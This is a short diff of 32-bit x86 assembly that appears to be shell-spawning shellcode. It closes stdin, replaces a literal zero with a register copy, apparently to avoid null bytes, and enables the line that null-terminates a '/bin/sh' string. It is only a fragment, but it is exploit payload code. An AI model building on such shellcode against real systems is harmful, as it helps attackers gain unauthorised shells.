@@ -16,7 +16,7 @@ function:
 
 	#closing stdin
 #	xorl %eax, %eax 		 Setting eax to 0
-	movb $0x0, %bl
+	movb %al, %bl
 	movb $0x6, %al			# Setting eax to 6 (close)
 	int $0x80
 
@@ -49,7 +49,7 @@ function:
 
 	xorl %eax, %eax
 	popl %esi
-#	movb %al,0x7(%esi)		# NULL terminate /bin/sh
+	movb %al,0x7(%esi)		# NULL terminate /bin/sh
 	push %eax
 	push %esi
 
